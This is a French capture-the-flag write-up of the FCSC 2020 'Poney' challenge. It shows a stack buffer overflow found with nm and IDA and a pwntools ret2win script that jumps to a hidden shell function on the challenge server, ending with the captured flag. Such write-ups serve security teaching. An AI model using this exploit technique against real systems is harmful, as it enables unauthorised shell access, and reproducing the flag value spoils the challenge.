<center><h1>FCSC 2020 - Poney Writeup</h1></center>

<br><br>

<img src="https://img.onii.wtf/i/k9lha.png">

Nous nous retrouvons avec un binaire "Poney"

<br>

Après l'avoir téléchargé, on peut le lancer

```
mizaru@DESKTOP-23T8VRF:/mnt/c/Users/sMizaru/Downloads$ ./poney                                                          
Give me the correct input, and I will give you a shell:                                                                 
>>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA              
Segmentation fault (core dumped)
```

Un beau segfault nous est retourné, on est bel et bien sur un cas de buffer overflow.

<br>

Très bien observons notre binaire dans IDA:

<img src="https://img.onii.wtf/i/ty2ty.png"> 

Rien de très intéressant dans la fonction main, en revanche, nous avons une fonction nommée "shell"

<img src="https://img.onii.wtf/i/wsowf.png">

Et cette fonction fait appel à /bin/bash ! Il nous faudrait donc appeler la fonction shell, commençons, tout d'abord il nous faut l'adresse de notre fonction "shell".

```
mizaru@DESKTOP-23T8VRF:/mnt/c/Users/sMizaru/Downloads$ nm poney                                                         
0000000000600df0 d _DYNAMIC                                                                                             
0000000000600fb0 d _GLOBAL_OFFSET_TABLE_                                                                                
0000000000400760 R _IO_stdin_used                                                                                       
0000000000400928 r __FRAME_END__                                                                                        
00000000004007b8 r __GNU_EH_FRAME_HDR                                                                                   
0000000000600de8 d __JCR_END__                                                                                          
0000000000600de8 d __JCR_LIST__                                                                                         
0000000000601010 D __TMC_END__                                                                                          
0000000000601010 B __bss_start                                                                                          
0000000000601000 D __data_start                                                                                         
0000000000400630 t __do_global_dtors_aux                                                                                
0000000000600de0 t __do_global_dtors_aux_fini_array_entry                                                               
0000000000601008 D __dso_handle                                                                                         
0000000000600dd8 t __frame_dummy_init_array_entry                                                                                        
w __gmon_start__                                                                                       
0000000000600de0 t __init_array_end                                                                                     
0000000000600dd8 t __init_array_start                                                                                                    
U __isoc99_scanf@@GLIBC_2.7                                                                            
0000000000400750 T __libc_csu_fini                                                                                      
00000000004006e0 T __libc_csu_init                                                                                                       
U __libc_start_main@@GLIBC_2.2.5                                                                       
0000000000601010 D _edata                                                                                               
0000000000601020 B _end                                                                                                 
0000000000400754 T _fini                                                                                                
0000000000400528 T _init                                                                                                
0000000000400580 T _start                                                                                               
0000000000601018 b completed.6972                                                                                       
0000000000601000 W data_start                                                                                           
00000000004005b0 t deregister_tm_clones                                                                                                  
U fflush@@GLIBC_2.2.5                                                                                  
0000000000400650 t frame_dummy                                                                                          
0000000000400689 T main                                                                                                                  
U printf@@GLIBC_2.2.5                                                                                                   
U puts@@GLIBC_2.2.5                                                                                    
00000000004005f0 t register_tm_clones                                                                                   
0000000000400676 T shell                                                                                                
0000000000601010 B stdout@@GLIBC_2.2.5                                                                                                   
U system@@GLIBC_2.2.5
```

Si on regarde bien, on trouve très vite l'adresse de la fonction "shell"

```
0000000000400676 T shell
```

L'ASLR est désactivée donc aucunement besoin de se soucier.

Plus qu'a dev notre exploit :

```python

import pwn
from pwn import *

rem = remote("challenges1.france-cybersecurity-challenge.fr", 4000)

shell = 0x0000000000400676

p = "A"*60

p += p64(shell)

rem.sendline(p)
rem.interactive()
```

et regardons notre retour:

```
mizaru@DESKTOP-23T8VRF:/mnt/c/Users/sMizaru/Downloads$ python exploit.py                                                                                                
[+] Opening connection to challenges1.france-cybersecurity-challenge.fr on port 4000: Done                                                                              
[*] Switching to interactive mode                                                                                                                                       
Give me the correct input, and I will give you a shell:                                                                                                                 
>>> [*] Got EOF while reading in interactive                                                                                                                            
$ ls      
```
Aucun shell n'a pop, j'ai peut-être un peu forcé sur le padding, modifions-le.

```python
p = "A"*40
```

Essayons maintenant !

```
mizaru@DESKTOP-23T8VRF:/mnt/c/Users/sMizaru/Downloads$ python exploit.py                                                                                                
[+] Opening connection to challenges1.france-cybersecurity-challenge.fr on port 4000: Done                                                                              
[*] Switching to interactive mode                                                                                                                                       
Give me the correct input, and I will give you a shell:                                                                                                                 
>>> $ ls                                                                                                                                                                flag                                                                                                                                                                    poney                                                                                                                                                                   
$ cat flag                                                                                                                                                              
FCSC{725dd45f9c98099bcca6e9922beda74d381af1145dfce3b933512a380a356acf} 
```


Et voilà, Poney flagged ヾ(•ω•`)o, un challenge très simple.
